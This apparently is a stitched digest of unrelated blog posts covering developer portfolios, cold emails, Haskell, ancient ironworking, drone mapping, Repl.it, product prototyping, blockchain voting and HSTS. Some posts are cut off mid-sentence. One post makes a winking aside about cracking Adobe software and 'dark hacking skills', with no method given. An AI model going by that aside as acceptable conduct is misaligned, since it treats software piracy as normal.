<h2>- Privacy policies and private projects</h2>

<p>Some deals prohibit you from showing or even talking about them. You will usually sign a Non-Disclosure Agreement before starting such projects. Or, due to competition, you can't mention your them as your previous projects. I remember being at Jumia for an interview, and at the moment I mentioned that I worked at SuperPrice, I became suspicious. It feels like you are there to spy, or just to harm the organization...</p>

<p>I remember building some applications that one cannot be really proud of. What it means is that such applications are not necessarily healthy for everyone... I also built some that are private and proper to just one person.</p>

<h2>- Your magic wand skills</h2>

<p>There are other few skills you can't talk about with the majority of people. although you might be good at it and you have been building with them, you just can't say it out loud. Some good examples are your dark hacking skills, dark SEO tricks, cracking adobe cs6 (wink), etc.</p>

<h2>Commentary</h2>

<p>I know some of you might tell me to show the works in the localhost. Yes, we do that. But it's not always enough. That option means you must physically meet the client or the employer, and that's not always possible. Also, such people would not believe or value a project you show from your personal computer.</p>

<p>I also hope people in charge of employing developer consider some of these points to investigate candidates in a fair way.</p>

<h2>Your take away</h2>

<p>If you have not quit the job yet, or you are starting, it's important that you consider all those aspects I just spoke about. In addition, you can go on your own adventure and add a few experiences to your belt. To accompany you, here are a few suggestions I would like to give you:</p>

<h2>-- Work on durable ideas</h2>

<p>Try as much as possible to find projects that can live long enough. This implies making sure that the client is serious about their business and that the business heavily depends on the project you are building for them.</p>

<h2>-- Build some personal projects and maintain them</h2>

<p>You might not always have someone to work for, thus build something for yourself.</p>

<h2>-- Help clients to remain committed</h2>

<p>For some of your clients that are not well motivated about their projects, help them understand the projects' value and the importance to have the application you build for them. For example, you could help them renew their domain names when they go through tough times.</p>

<h2>-- Work for conscious clients or conscientize them before the job</h2>

<p>I call conscious clients those who know exactly WHY they need their project. Sometimes, they already have the application and just need you to improve it. Some have experience with the idea of using software and its advantages.</p>

<h2>-- <strong>Build something every year, at least a personal project.</strong></h2>

<p>This is my personal new resolution. It's one of the solutions I have found to fix this issue of our dying portfolios. Get to insert a new raw of projects in your resume every year. Find an idea of the project as a personal project and build it.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Why are 'cold emails' ... cold?</p>
<p>That's because <a href="https://akhilkg.me/blog/serendipity">serendipity</a> in real-life comes at a premium. </p>
<p>You have to be at the right place, at the right time to strike gold. You will need to jump over loops, be able to get favours, tackle people and conversations to get what you want - and in the end, this would just get you a 1-2 minute conversation with someone important. The fancy term for this is “warm introductions”.</p>
<p>'Online' serendipity - like many things 'online' - is straightforward. You are "only” an email away from a potential investor, a mentor, or a customer. </p>
<p>Nothing beats getting a warm introduction to someone but cold emails don't have to be "cold". They can be warm. </p>
<p>Let me give you two personal examples of not-so-cold emails - one which worked and one which didn’t. The emails went to two of my favourite startup people when I was trying to collect and organise my thoughts around an idea.</p>
<hr>
<p>Your 'warm' emails should take you a lot of time to write, which is good. Each email has its own set of characteristics depending on whom you are sending it to  i.e. here, your motive with warm emails is to build a long term relationship with the person you are sending it to.</p>
<p>And so, the receiver should feel that you have done your homework and you are not someone who is just sending the same mail to a lot of people and expecting to get a response.</p>
<p>At its heart, it's just talking your heart out - nothing else. No fancy salesmanship or trying to impress. </p>
<p>The best warm emails are honest, actionable, and waste no time for the reader. There is no fluff nor beating around the bush and ideally, it wouldn’t even cross 2 or 3 paragraphs.</p>
<p>For my first mail that worked, it started with an incredibly personal and heartfelt message. I had been following this person's content for last 5-6 years or so. He has had an impact on my viewpoint of the world much more than any other figure at the time and I believe it was his answers that sowed the seeds for entrepreneurship early on.</p>
<p>The best warm emails you will write will be automatically for the people who you believe the most in,- you will be at the most genuine, honest version of yourself  - just like how water flows inevitably through a bed of rocks - this works almost always.</p>
<p><img src="https://user-images.githubusercontent.com/32199592/98252728-44892880-1fa0-11eb-90f9-d9f2ef37bf65.jpg"></p><p>Watch the subject line, it is eye-catching. From his perspective, it’s actually relatable. The receiver in this case is a popular writer on Quora and as was described in one of his answers - at one point, he was a 'young follower' himself. The rest of the email described my startup where I asked him for his feedback.
This worked and he responded.</p>
<p>Also, note that the platform you use matters a lot. Use the platform where the receiver is less likely to be bombarded by random strangers / where the receiver has a lot of followers. For this guy, the worst place to send him the mail would have been on Quora.</p>
<p>For the one that didn’t work - the principles remained the same but I focused too much on “getting help” rather than “connecting” - it started with this:</p>
<p><img src="https://user-images.githubusercontent.com/32199592/98252734-4652ec00-1fa0-11eb-88c2-3ae94eea6e4c.jpg"></p><p>And this was at the end:</p>
<p><img src="https://user-images.githubusercontent.com/32199592/98252740-46eb8280-1fa0-11eb-9c09-dff29cb7ac86.jpg"></p><p>Reading it now, it just feels like a cooked up half-assed effort to get some feedback.</p>
<hr>
<p>Takeaways:</p>
<ul>
<li>Connect with the person on a deeper level to whom you are sending to. Read their tweets, read all of their blog posts, see what they have built. Come to appreciate a thing or two about the person whom you are sending it to - you can’t write well if you don’t feel it.</li>
<li>Be genuine &amp; expect nothing and no, not even a response. Sounds counter-intuitive, but it works :) I’m not saying don’t ask for help, ask for help - but at the same time, you should be okay without their help as well. Try your best.</li>
<li>Mind the platform. Use the platform which the person expects something important to come through. You could also try multiple times but don’t spam.</li>
<li>Make sure your content is actionable &amp; clear. Ensure your email/message will be opened from its first line/subject. If you ask for too much, the person might just think “Okay, I will respond to this person later” and you end up never getting a response. Instead, ask for something short and sweet, and from there you can build a conversation.</li>
</ul></div></div>]]>

<p>In <a href="https://www.mmhaskell.com/real-world/databases">part 1</a> of this series, we'll use the Persistent library and Template Haskell to create a simple database schema. This will enable us to run migrations with ease. It will also allow us to write some simple type safe SQL queries!</p>

<p>Once we have our database set up, we'll want to serve the information we're storing over a web API. We'll do this with the Servant library. Servant allows us to build endpoints that retrieve their query parameters in a type-safe way! Find out how in <a href="https://www.mmhaskell.com/real-world/servant">part 2</a> of the series!</p>

<p>Now that we have our API set up, we'll see how we can make it faster by adding a Redis cache! We'll learn how to use the Redis bindings for Haskell so we can avoid using the database for some of our queries! See how it all works in <a href="https://www.mmhaskell.com/real-world/redis">part 3</a>.</p>

<p>Our end-to-end system is now quite complicated, so testing it is difficult for a variety of reasons. In <a href="https://www.mmhaskell.com/real-world/docker">part 4</a>, we'll see some techinques to test our web API. We'll also use Docker to make this process easier.</p>

<p>In the <a href="https://www.mmhaskell.com/real-world/esqueleto">final part</a> of our Real World Haskell series, we'll learn some more about advanced SQL queries. We'll extend our schema and use the Esqueleto library to perform type safe joins between our different data types!</p>

<p>This series goes over some cool libraries, but there's still so much more to explore! Check out our <a href="https://www.mmhaskell.com/production-checklist">Production Checklist</a> and explore a ton of other libraries you can use for various tasks when making a production system in Haskell!</p>

<p>This week, as an addendum to our four(and a half)-part (<a href="https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">I</a>, <a href="https://acoup.blog/2020/09/25/collections-iron-how-did-they-make-it-part-ii-trees-for-blooms/">II</a>, <a href="https://acoup.blog/2020/10/02/collections-iron-how-did-they-make-it-part-iii-hammer-time/">III</a>, <a href="https://acoup.blog/2020/10/09/collections-iron-how-did-they-make-it-part-iva-steel-yourself/">IVa</a>, <a href="https://acoup.blog/2020/10/16/collections-iron-how-did-they-make-it-part-ivb-work-hardening-or-hardly-working/">IVb</a>) look at pre-modern iron and steel production, we’re going to look at two alternative regional processes, where they fit into the entire iron production process that we detailed already, how they worked and what kind of product they produced.  In particular, we are going to look at the early production of cast iron in China, and the production of a form of crucible steel, called <em>wootz</em>, in India (and South Asia more broadly).</p>



<p>First, some necessary caveats.  Neither of these methods of iron production were practiced in my core area of research (the greater Mediterranean world during the Hellenistic and Roman periods), although <em>wootz</em> steel was imported in small quantities during that time and a handful of cast iron goods produced in China also made it to the broader Roman or Hellenistic world (though very, <em>very</em> few).  Consequently my knowledge here is much thinner and I am much more reliant on reporting the work of other scholars.  Moreover, some of the scholarship on these topics is in languages I do not read, so I am also reliant on other scholars for that.  As such, this is going to be a much more general discussion of these processes and I am going to be a bit more cautious about what I say about them.  At the same time, I simply don’t have the information to talk much about the details of the lives of the iron-workers here themselves, like I could in the previous posts, so this will mostly focus on process and product, rather than people.</p>



<p>That said, I thought this was still worth doing because it seems like there is quite a bit of unhelpful ‘mystique’ surrounding both.  On the one hand, a lot of the discussion of the production of cast iron in China fails to really put the innovation both in the correct spot in the iron production process but also in the correct context in terms of the development of iron-working technology.  On the other hand, much of the popular discussion about <em>wootz</em> steel in India treats it as this quasi-legendary ‘lost’ and mysterious production process when it is, in fact, a fairly well understood method of producing high-quality steel.</p>



<p>And of course, as always, if you want to support my essay production process, you can do so via <a href="https://www.patreon.com/user?u=20122096">Patreon</a> and by sharing to my work to a wider audience (but please do not copy-and-repost these essays; link to them instead).  And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings (and I promise fewer political musings now that the electoral<em> <em>götterdämmerung</em></em> has come and – heavens I hope by the time this post goes live – gone).</p>






<p>(Subsequent edit: Due to some election-related trolling coming from off-site, I had to prune back the comments to the original topic.  Apologies for those whose comments were pruned (except the troll) but I wanted to keep us on topic and away from the abyss of endless political carping.)</p>



<h2>Cast Iron in China</h2>



<p>Now I’ve stated several times during this series that generally speaking the bloomeries used to smelt iron in the pre-modern period were not capable of reaching the high temperatures (1538 °C) required to actually melt iron and instead produced pure metallic iron through solid state reduction (that is, the bloomery process) along with, essentially, melting everything that <em>wasn’t</em> iron out of the bloom.  And for most of the world in most of the pre-modern period, this is true.</p>



<p><strong>China appears to be the odd exception</strong>.  I should note that this is an area of scholarship that is still quite active – dates are still in flux (shifting back as new discoveries push back the earliest dates) and the exact nature of the transitions from bronze-working to iron-working in China and the degree to which the bloomery processes we’ve discussed served as an intermediate stage is still debated, as far as I know.  A fair bit of the discussion of the question is, unsurprisingly, in Chinese, which I cannot read.  So I am doing my best to provide a summary of what I know.</p>

<p>Cast iron in China seems to become widespread during the Warring States period (453-221), though the technology itself probably had its genesis in the earlier Spring and Autumn period (770-454) and it becomes truly ubiquitous during the early Qin-Han Period (221 BC – 220 AD).  The general working hypothesis based on the evidence is that the cast iron product emerged not out of bloomery iron production (which seems to have been used in China side-by-side with cast iron production for the first couple of centuries) but instead out of the furnace techniques already in use for casting objects in copper-alloy (read: bronze), until the cast iron process became able to produce a high enough quality iron product that it supplanted bloomery production, probably in the last century BC. Again, those dates are very approximate and seem to me to still be significantly unsettled, going by the range I’ve seen in scholarship (the most recent I could find on this was “Everything Old is new Again?  Rethinking the Transition to Cast Iron production in the Central Plains of China” in <em>Journal of Anthropological Research</em> (2014), so those are the dates I have gone with; Craddock and Tylecote both have somewhat later dates).</p>



<p>The basic interaction of producing cast iron centers around one oddity in carbon-iron alloys: <strong>as you add more carbon to iron, the melting point of the resulting mixture drops</strong>.  At 4.3% carbon content, the melting point of iron drops to just 1150 °C, which <a href="https://acoup.blog/2020/09/25/collections-iron-how-did-they-make-it-part-ii-trees-for-blooms/">as you will recall</a>, is very much within reach for pre-modern furnaces worked by bellows (and China seems to have generally had better, hotter furnaces than contemporary pre-modern Europe to boot).  Adding small amounts of either sulfur (typically from coal being used to supply the carbon) or phosphorous can lower the melting point further, although these can also make the metal brittle.  At that point, large, bellows-fed furnaces can heat the iron-carbon mixture up to the point where it melts and becomes sufficiently fluid to cast (slag and other impurities, being lighter, can be drawn out with a flux and tapped off).  <strong>The result is cast iron</strong> (also called ‘pig iron’).</p>



<p>The <em>problem</em>, as we’ve discussed earlier, <strong>is that cast iron</strong> (which, to be clear, iron produced this way is still cast iron, even if you aren’t pouring it into a model; it is a type of iron as will become plain) <strong>comes out of the process with unfavorable characteristics</strong>, particularly in strength, brittleness and malleability – <strong>in short, it is too hard, too weak, and too prone to break and crack rather than bend</strong>.  The carbon content of cast iron is, of course, very high: above 4%, the carbon makes the iron much too hard and inflexible, causing it to become extremely brittle.  In particular, if the silicon content (which is likely to come from bits of slag melting and dissolving into the iron at the high temperatures) is low and the iron is cooled fairly quickly, it forms into cementite, which is hard and brittle.  Cementite isn’t bad in and of itself – <a href="https://acoup.blog/2020/10/16/collections-iron-how-did-they-make-it-part-ivb-work-hardening-or-hardly-working/">we saw this with heat-treated steel</a>, where just a bit of cementite among the ferrite offered improved strength and hardness.  But this is not just a little cementite, it is <em>lots of cementite</em>.  In excess of 60% cementite, what is sometimes called <a href="https://en.wikipedia.org/wiki/Cast_iron#White_cast_iron">‘white’ cast iron</a>.  <strong>At these levels, the amount of cementite leaves the cast iron very hard and very brittle, likely to break</strong> <strong>and actually difficult to cast effectively</strong> (because it is likely to crack from thermal stresses as it cools).</p>

Using mechanical assistance like this would have made the furnace operation significantly more labor efficient.</figcaption></figure>



<p>More slowly cooled cast iron with high silicon content, can come as <a href="https://en.wikipedia.org/wiki/Cast_iron#Grey_cast_iron">‘grey’ cast iron</a>, which has less cementite, but has instead pockets of <a href="https://en.wikipedia.org/wiki/Graphite"><em>graphite</em> </a>– little pockets of cure crystalline carbon which couldn’t be absorbed into the iron – which have very little strength and essentially functions as cracks within the iron, reducing the overall toughness considerably.  Craddock notes that early Chinese cast iron tends to be grey cast iron, but – curiously – with somewhat lower silicon contents than we’d expect for grey cast iron.  So for almost any tool or weapon use, our cast iron is functionally worthless: too brittle to sustain meaningful stress.  <strong>But we’re not done.</strong></p>



<p><strong>The key technique that Chinese ironworkers seemed to have developed here is <em>malleablisation</em>.</strong>  By heating the iron to melting temperatures (or just below) in an oxidizing environment (which is to say, open to the air) the ironworker can cause a few things to happen.  First, the oxidation process begins to draw off the carbon from the iron (again, you will remember the tendency of heat and air to decarburize iron from<a href="https://acoup.blog/2020/10/09/collections-iron-how-did-they-make-it-part-iva-steel-yourself/"> our discussion of making steel</a>).  At the same time, the graphite which originally was in long, thin flakes begins to form into more compact round shapes which cause less strain on the metal (there is also just <em>less</em> of that graphite, because it is made of the carbon that the air is drawing off in the decarburization process).  If the iron is kept hot and open to the air long enough, it can either be decarburized to steel or even all of the way to wrought iron, making it usable for tools, weapons, armor and the like.</p>



<p>(I should note that somewhat different processes for removing carbon to make cast iron workable as wrought iron, called <strong><a href="https://en.wikipedia.org/wiki/Finery_forge">fining</a></strong>, emerged in late medieval Europe.  This was done at a finery forge (we start to see these as early as the 13th century AD in Europe and involving breaking cast iron into smaller chunks and then heating …</p></div></div>

November 5, 2020 | https://www.opendronemap.org/2020/11/opendronemap-2-1-0-the-biggest-update-yet/ | <a href="https://web.archive.org/web/*/https://www.opendronemap.org/2020/11/opendronemap-2-1-0-the-biggest-update-yet/">archive.org</a>

<p>That title might be clickbait, but it is meant as a nod to the feature parity that has been long in the making between OpenDroneMap relative to more mature projects, whether those more mature projects are the venerable, free and open source MICMAC or its derivatives in the form of the various closed-source offerings in the photogrammetry industry.</p>



<p>So, is 2.1.0 the biggest update yet? I would say it’s the update that suddenly brings us to feature parity in almost all categories. And it all starts with improved structure from motion (updates to OpenSfM), continues through improved point clouds (replacement of MVE with OpenMVS), and finishes with improved (waves at) everything.</p>



<h2>Speed and Structure from Motion</h2>



<p>With the update to the latest OpenSfM, we see a 25-45% speed up in portions of OpenSfM processing. This is very exciting and due to some low level changes, specifically: “reprojection of derivatives … are now computed analytically instead of autodiff-ed”. There are other, subtler improvements to OpenSfM, but that is the feature most noticable to end users.</p>



<h2>Speed and dense point cloud production</h2>



<p>The MVE library has been swapped out for OpenMVS. On the surface, this slows things down: for the same resolution depthmaps, OpenMVS runs at half the speed of MVE. But, the speed comparison is deceptive: we see such a high quality improvement from changing libraries, we can easily run at lower depthmap values and get better results resulting in an effective speed increase, with improved quality.</p>



<h2>Quality improvements</h2>



<p>The biggest noticeable change will be in the quality of point cloud outputs and all subsequent products, from orthophotos to digital surface models, and digital terrain models.</p>



<figure><img src="https://www.opendronemap.org/wp-content/uploads/2020/11/znz_lowres.jpg" alt=""><figcaption>Improved point cloud over Stone Town, Zanzibar, Zanzibar Mapping Initiative</figcaption></figure>



<p>Because the point clouds effect the quality throughout the rest of the toolchain, we see substantially improved digital surface models:</p>



<figure><ul><li><figure><img src="https://www.opendronemap.org/wp-content/uploads/2020/11/stonetown_2.0.0_1.jpg" alt="" data-id="1003" data-link="https://www.opendronemap.org/?attachment_id=1003"></figure></li><li><figure><img src="https://www.opendronemap.org/wp-content/uploads/2020/11/stonetown_2.1.0_1.jpg" alt="" data-id="1004" data-link="https://www.opendronemap.org/?attachment_id=1004"></figure></li></ul><figcaption>Stone Town, Zanzibar digital surface model. 2.0.0 on left, 2.1.0 on right</figcaption></figure>



<figure><ul><li><figure><img src="https://www.opendronemap.org/wp-content/uploads/2020/11/stonetown_2.0.0.jpg" alt="" data-id="1000" data-link="https://www.opendronemap.org/?attachment_id=1000"></figure></li><li><figure><img src="https://www.opendronemap.org/wp-content/uploads/2020/11/stonetown_2.1.0.jpg" alt="" data-id="1001" data-link="https://www.opendronemap.org/?attachment_id=1001"></figure></li></ul><figcaption> Stone Town, Zanzibar digital surface model. 2.0.0 on left, 2.1.0 on right </figcaption></figure>



<p>Higher fidelity in point clouds results in better automated point cloud filtering:</p>



<figure><img src="https://www.opendronemap.org/wp-content/uploads/2020/11/7070_dxm.gif" alt=""></figure>



<p>And so on. Updates are committed and out in the wild. It’s time to update your OpenDroneMap instance and have fun with the improved quality and speed.</p>



<h2>How much better?</h2>



<p>So, how much better are these point clouds? How do they compare to the rest of the industry? You don’t have to take our word for it, check out the leaderboard at <a href="https://www.tanksandtemples.org/leaderboard/">tanksandtemples.org</a>.</p>



<p>You’ll find the OpenMVS leads amongst FOSS solutions. Look closely enough, you might find a closed source drone image processing favorite trailing OpenMVS by a large margin… .</p>



<p>(Footnote, these leaderboard comparisons don’t compare the combination of OpenSfM and OpenMVS, but are a decent proxy for a full comparison).</p>



<h2>Is this really bigger than that closed-source product?</h2>



<p>Probably. OpenDroneMap has for more than a year had the benefit of being one of the most scalable solutions, both from a technology perspective with an industry leading process for splitting and recombining datasets, but from the licensing “technology” with licensing that costs the same amount regardless of how many machines it is deployed to.</p>



<p>In 2019, we saw OpenDroneMap process datasets in excess of 30,000 images into a spatially harmonized dataset, something at the edge of the possible at the time. In 2020, we have seen 90,000 image datasets successfully processed in the same way. It might be the largest spatially harmonized dataset yet processed, though we are happy to hear of similar projects in case we are wrong!</p>



<h2>Is this really better than that closed-source product?</h2>



<p>The recent (2 day old) quality improvements don’t just benefit from OpenMVS. OpenSfM does an industry leading job of balancing the accuracy of GPS information with the quality of camera calibration. This means that for massive datasets where you need good 3D data, OpenDroneMap can deliver a good product for things like flood modeling, terrain change detection, and other data needs that are sensitive to three-dimensional fidelity.</p>



<h2>Time to try, try again, or upgrade</h2>



<p>It is probably time for you to upgrade. If you haven’t tried OpenDroneMap before, or if it has been a while, then it is time to try it with your dataset. In the meantime, enjoy these screen shots from data produced by Federico Debetto, KMedia SAS, which just like the Zanzibar Mapping Initiative data above, is from Unguja Island, Zanzibar:</p>

		<p>When we started Repl.it, we set out to remove all friction from getting started with programming. That also meant getting out of the way and letting you code as quickly as possible. As part of that, and for a long time, you could start coding on Repl.it without a user account. </p>
<p>We anticipated that giving free unfettered compute to the universe would be challenging. Still we didn't flinch and made it a point to innovate on sandboxing, security, and anti-abuse tools, and we've been largely successful at that. Today, Repl.it the largest open compute platform on the internet, one where you don't need a credit card or even an account to start executing. We run 150,000 concurrent containers, which is 10x what we used to run last year.</p>
<p>We have our fair share of war stories, like when we had to battle dark-web hackers trying to sell DDoS attacks from our site for Bitcoin. Luckily reCAPTCHA from Google was a massive help, protecting against botting made it possible for us to continue to grow and offer our services for free.</p>
<p>Sadly, earlier this year, Google surprised us that they're going to be charging for reCAPTCHA. Of course, it makes business sense for them, but for a startup like ours, operating at the scale we operate at, it meant that we have to pay them more than we make in monthly revenue<small>[1]</small>.</p>
<p>That leaves us with two choices:</p>
<ul>
<li>leave the site vulnerable to botting and attacks resulting in an immense amount of time spent fighting abuse and risking outages</li>
<li>phase out the anonymous experience and focus our efforts and tools on securing the logged-in user experience</li>
</ul>
<p>We decided to go with the latter, and we hope you'll stick with us and create an account. Beyond the 5 minutes it takes to sign up, there is only an upside to doing so. We don't collect much data, and we respect user privacy. You're also going to unlock many features that were invisible for you in the anonymous experience:</p>
<ul>
<li>Name and organize your repls</li>
<li><a href="https://repl.it/site/hosting">Host apps and websites</a></li>
<li><a href="https://repl.it/site/multiplayer">Collaborate with others in Multiplayer</a></li>
<li>Claim and build a profile with the repls you're most proud of</li>
<li>Particpate in our <a href="https://repl.it/site/community">community forums</a></li>
</ul>
<p>And many more that we're sure you'll enjoy discovering.</p>
<h2 id="timeline">Timeline</h2>
<p>Google gave us only one month to move off, so we're going to have to move fast. Here are the changes to expect in the upcoming few weeks: </p>
<ul>
<li>We'll transition our language pages (<code>/languages/{lang_name}</code>) to a barebones REPL with limited opportunity for abuse. That way if you're used to using Repl.it to try out just a bit of code, you can continue to do that without logging in</li>
<li>repl.run, the url endpoint you could access command-line apps will redirect to the repl. repl.run is inherently anonymous, which makes it an attack vector without captcha</li>
<li>finally, you'll have to login to create a repl and save your work</li>
</ul>
<p>We remain committed to openness and instantness -- two principles that have made Repl.it special. I am thrilled to see you on the inside!</p>
<hr>
<p><small>1: it's worth noting that we're already big Google Cloud customers, and our spend only continues to grow with them. </small></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Last year I was obsessed with Generative Art - that's art that is generated using only algorithms.&nbsp;</p>
<p>In the image below, I forced an algorithm to draw me (yes, that's me) having learnt only about triangles. If you want to see more impressive art you should check out <a href="https://tylerxhobbs.com/">Tyler Hobbs</a> and this <a href="https://www.reddit.com/r/generative/">sub-Reddit</a>.</p>
<p><img alt="My Generative Art" src="https://jon.io/images/genart.gif"></p>
<p>But how do we perceive shapes and ideas when we are forced to limit ourselves? Can we extract the basics of a product by eliminating the unnecessary?</p>
<h2>This bicycle does not&nbsp;exist</h2>
<p>If you go to <a href="https://thispersondoesnotexist.com/">ThisPersonDoesNotExist</a> and you keep refreshing the page, you will see every time a photo of person that doesn't exist. That photo has been generated by a Machine Learning algorithm that mashes millions of photos together and comes up with a new face every time.&nbsp;</p>
<p>A friend of mine introduced me to <a href="https://www.gianlucagimini.it/portfolio-item/velocipedia/?fbclid=IwAR3mtHozjRDKoawWPS6PcYeltg4jvZucLnvuj4RrGkWWeRlVr0fhk5cvZv8">Velocipedia</a>, a project where people are asked to draw bicycles from memory.&nbsp;</p>
<p><img alt="Bicycle" src="https://jon.io/images/artbike.png"></p>
<p>The majority of the bicycles drawn have some vital flows. <strong>These bicycles cannot exist</strong>.&nbsp;</p>
<p>As Gianluca Gimini says:&nbsp;</p>
<blockquote>
<p>Little I knew this is actually a test that psychologists use to demonstrate how our brain sometimes tricks us into thinking we know something even though we don't.</p>
</blockquote>
<p>How about we do this for building products?</p>
<h2>This Product Does Not&nbsp;Exist</h2>
<p>For the last couple of months I am building a new platform that teaches you how to build a Startup <strong>fast</strong> and the number one problem is overthinking about your first version.&nbsp;</p>
<p>And of course the majority of founders are building their prototype without ever talking to at least 10 customers. Crazy right?</p>
<p>I am (obviously) guilty of overthinking too when it comes to product development so I decided to ask 20 users to draw, using only pen and paper, the landing page and one functional page. This could work with just 5 users by the way. This is the message that I've sent them</p>
<p><img alt="Sent by me" src="https://jon.io/images/sentbyme.png"></p>
<p>You can try it yourself if you want before seeing the results.</p>
<h2>What I've learnt from the landing&nbsp;pages</h2>
<p><strong>1/ What <em>I</em> like is not what my users like</strong>
<img alt="Landing" src="https://jon.io/images/proone.png"></p>
<p>90% of the landing pages had a video/teaser which is something <strong>my design didn't have</strong>. I don't like having videos in landing pages but it seems that for educational content, it is a must.</p>
<p><img alt="Landing" src="https://jon.io/images/protwo.png"></p>
<p><strong>2/ Users expect discounts</strong></p>
<p><img alt="Landing" src="https://jon.io/images/prothree.png"></p>
<p>Most of the designs had a "free week" or "buy now and get X% discount". <strong>I have this too</strong> (you get most of the chapters for free) but not in that prominent space.</p>
<p><strong>3/ Testimonials were not such a big theme</strong></p>
<p><img alt="Landing" src="https://jon.io/images/profour.png"></p>
<p>Every landing page that had testimonials didn't dedicate a lot of space to them and it was usually on the second page (under the fold). <strong>That was my wrong assumption</strong>, thinking that I needed to have a good amount of testimonials.</p>
<p><strong>4/ Pay attention to interesting ideas</strong></p>
<p><img alt="Landing" src="https://jon.io/images/profive.png"></p>
<p>There were some landing pages that were 100% different from the rest. I am definitely going to integrate some ideas from them. It what makes products different, interesting and fun to use.</p>
<h2>What I've learnt from the functional pages</h2>
<p><strong>5/ Video is king - but text is his Queen</strong></p>
<p>Notes, action lists, descriptions and extra resources. <strong>I HAD NO IDEA</strong>.
&nbsp;
Now it makes sense. Users want more material and want to be able to go back and look at their notes.&nbsp;</p>
<p><img alt="Landing" src="https://jon.io/images/prosix.png"></p>
<p><strong>6/ Group chat and discussions</strong></p>
<p><img alt="Landing" src="https://jon.io/images/proseven.png"></p>
<p>This is a much more difficult feature but it seemed important for a lot of users. I would try using Slack/Discord before building something into the product.</p>
<h2>The Perfect User Does Not&nbsp;Exist</h2>
<p>I could have built the landing user-generated landing page waaaaaay faster than the one I designed. Making assumptions and believing in them is the worst way to build a Startup.</p>
<p>If you want to learn how your users can use your product, eliminate all your biases. Give them a pen and paper and tell them to draw the UI. Focus on the commonality, build fast and have them try it out again.&nbsp;</p>

                <div>
                    <p>Any time there is an election the inevitable question crops up about electronic voting. Paper ballots are rounded up, and there are delays in counting, recounts, contesting, nail-biting, and political shenanigans. Frustrated tweeters will shout:</p><blockquote>Why aren't we just voting with a blockchain? All these problems will be solved!</blockquote><p>As much as we love blockchains, and we've built products on them we love them that much, they are <strong>definitely not </strong>at a technological stage where they could replace our voting systems. They would solve some huge problems, but voting has two crucial requirements that any replacement system still needs to meet:</p><ol><li>A citizen must only cast a <strong>single </strong>vote.</li><li>A citizen's vote is anonymous so it is <strong>true</strong>.</li></ol><p>These aren't hard problems on their own, but when they're put together they must remain exclusive.</p><p>If we look at a blockchain voting system, then we'd effectively be looking at a mechanism where a citizen would hold a unique private key (somehow), and they'd be digitally signing a vote to add to the chain. Once confirmed the chain would then hold an immutable record of the vote.</p><h2 id="only-one-vote">Only one vote</h2><p>It seems pretty straightforward, but there need to be protections in place for making sure a user can only vote once. Voting in elections usually takes place across large geographical regions, so you need to have systems in place to prevent a user visiting multiple polling booths and casting the same vote multiple times to inflate the count.</p><p>Blockchains would absolutely solve this problem. Once a citizen's private key has digitally signed their vote onto the chain and it's been confirmed, then it's an immutable record and they can no longer cast any more additional votes, and their vote cannot be changed in any way.</p><h2 id="anonymity">Anonymity</h2><p>A voter must be able to cast a vote in absolute privacy, otherwise there can be social or economic pressure to vote in one direction or another if the public could see who voted for who. In some countries this may to be in the form of moral pressure. In other countries this may manifest in threats to physical safety if one chooses to vote against the incumbent. Anonymity gives a guarantee that the votes are truly reflective of the citizen's desires (we'll ignore the effects of misinformation, advertising, and close social pressures, which may still affect a vote).</p><p>Blockchains <em>can</em> solve this problem, as long as the user's identity remains separate from the actual vote event. And this is where problems start to appear.</p><h2 id="what-blockchains-don-t-solve">What Blockchains Don't Solve</h2><h3 id="anonymity-is-still-a-problem">Anonymity is still a problem</h3><p>If you add a record onto a blockchain, like a citizen casting a vote, then there needs to be a binding of the user's private key that signed the transaction and a binding to the user's identity to detect duplication. This instantly throws out the anonymity, as you end up with an immutable ledger showing exactly who voted for what.</p><h3 id="holding-private-keys">Holding private keys</h3><p>It's all well and good to declare that citizens must add their votes to a chain, but how exactly do they hold the private key that signs the transaction? How do you guarantee that it's <em>only</em> the citizen in control of that key? How do you detect stolen keys, or misplaced keys, or falsley registered keys?</p><p>Do you give each citizen a smartcard? A YubiKey? This still hasn't solved any problems, and there's still the <a href="https://xkcd.com/538/">$5 wrench attack</a> if you choose to rely on those.</p><h3 id="the-software-problem">The Software Problem</h3><p>Let's say you've solved the above problems. What about the software? How do you guarantee a vote hasn't been modified before being added to the chain? If a citizen can see a confirmation of successful vote on the chain at the polling place, how do you verify the confirmation message also hasn't been tampered with?</p><p>How do you guarantee the software that conducts the counts isn't also tampered with? How do you guarantee that private keys aren't being stolen and used to cast different votes at future elections?</p><h2 id="possible-solution-multiple-chains">Possible Solution: Multiple Chains</h2><p>So if we need to split the event that a user voted on a chain and the actual vote itself, we could run 2 separate chains. One that holds all voter registration events, and one that holds all votes. Any variance in the number of events in each would indicate a problem immediately.</p><p>But this still raises more problems:</p><ul><li>How do you know the votes are actually from the voter themselves? If you bind a timestamp or other factor between the two chains, then there's a way to link the voter to the vote, removing anonymity.</li><li>How do you still have assurance that the private key holder is the actual entity that submitted the vote?</li><li>If there is somehow a duplicate voter, how do you discern which vote was falsified?</li></ul><h2 id="paper-is-still-superior">Paper is still superior</h2><p>As frustrating it is, paper still holds the crown of meeting the 2 key requirements for voting. Voters can register their identities for the vote to prove a single vote was cast, and the vote itself is managed as a separate physical entity with no identity bound to it. Voters are also able to vote privately to avoid external influences. It's subject to human errors during counting, but those can be alleviated with applying more humans, better coordination, and recounts if necessary.</p><p>If a blockchain system can replicate the paper system perfectly, without the issues that computer-based systems introduce themselves around software integrity, then it has a real shot as a replacement. But until then, paper is the best.</p>

November 5, 2020 | https://daniel.haxx.se/blog/2020/11/03/hsts-your-curl/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/11/03/hsts-your-curl/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security" target="_blank">HTTP Strict Transport Security</a> (HSTS) is a standard HTTP response header for sites to tell the client that for a specified period of time into the future, that host is not to be accessed with plain HTTP but only using HTTPS. Documented in <a href="https://tools.ietf.org/html/rfc6797">RFC 6797</a> from 2012.</p>



